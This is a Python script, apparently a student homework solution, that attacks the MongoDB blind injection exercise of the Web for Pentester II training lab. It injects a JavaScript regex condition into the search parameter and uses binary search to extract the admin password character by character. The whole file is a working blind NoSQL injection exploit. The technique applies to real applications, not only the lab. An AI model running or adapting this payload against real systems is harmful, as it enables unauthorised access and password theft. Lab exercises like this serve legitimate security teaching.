'''
This program is the solution for WFP2 Mongodb Blind Injection

Usage: alex_rose_hw1.py <hostname or IP of WFP2 site to attack>
It assumes the password of the admin account is alphanumeric
and uses a binary search algorithm to minimize the number of 
guesses to discover the password
Alex Rose 2-18-19
'''
import requests, sys, urllib
from bs4 import BeautifulSoup

def try_password_range(url, password, chars):
    '''
    Tests a range of characters to find the next character of the password

    Implements a binary search to minimize the number of guesses

    Args:
        url (string): url of WFP2 site to attack
        password (string): the password so far
        chars: range of characters to test

    Returns:
        Next character of password if successful, nothing if not
    '''
    if len(chars) == 1:
        if try_password(url, password, chars):
            return chars
        else:
            return

    firstHalf = chars[:len(chars) // 2]
    secondHalf = chars[len(chars) // 2:]

    if try_password(url, password, firstHalf):
        return try_password_range(url, password, firstHalf)
    else:
        return try_password_range(url, password, secondHalf)
         
def try_password(url, password, chars):
    '''
    Checks whether our password (so far) and a range of possible next characters is correct

    Args:
        url (string): url of WFP2 site to attack
        password (string): the password so far
        chars: the range of characters to test

    Returns:
        True if chars contains the next character of the password
        False if the chars doesn't contain the next character of the password
    '''
    fullUrl = url + "/mongodb/example2/?search=admin%27%20%26%26%20this.password.match%28%2F%5E" + password + "%5B" + chars + "%5D.%2A%24%2F%29%2F%2F"
    session = requests.Session()
    response = session.get(fullUrl)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    if(soup.body.findAll(text='admin')):
        return True
    else:
        return False


if len(sys.argv) != 2:
    print("Usage: alex_rose_hw1.py <url>")
    sys.exit(1)

searchlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
victimUrl = sys.argv[1]

if "http://" not in victimUrl:
    victimUrl = "http://" + victimUrl 

'''
test url for errors
'''
try:
    testRequest = requests.get(victimUrl)
    if testRequest.status_code != 200 or "Web for Pentester II" not in testRequest.text:
        print("invalid WFP2 url provided!")
        sys.exit(1)
except requests.ConnectionError as e:
    print("invalid WFP2 url provided!")
    sys.exit(1)

password = ""
found = False

'''
This is the main loop.  While we keep discovering more characters,
keep trying for more.  When we don't find another character, we've 
found the password.
'''
while not found:
    char = try_password_range(victimUrl, password, searchlist)

    if char:
        password += char
        print(password)
    else:
        found = True
        print(password + " is the password!")
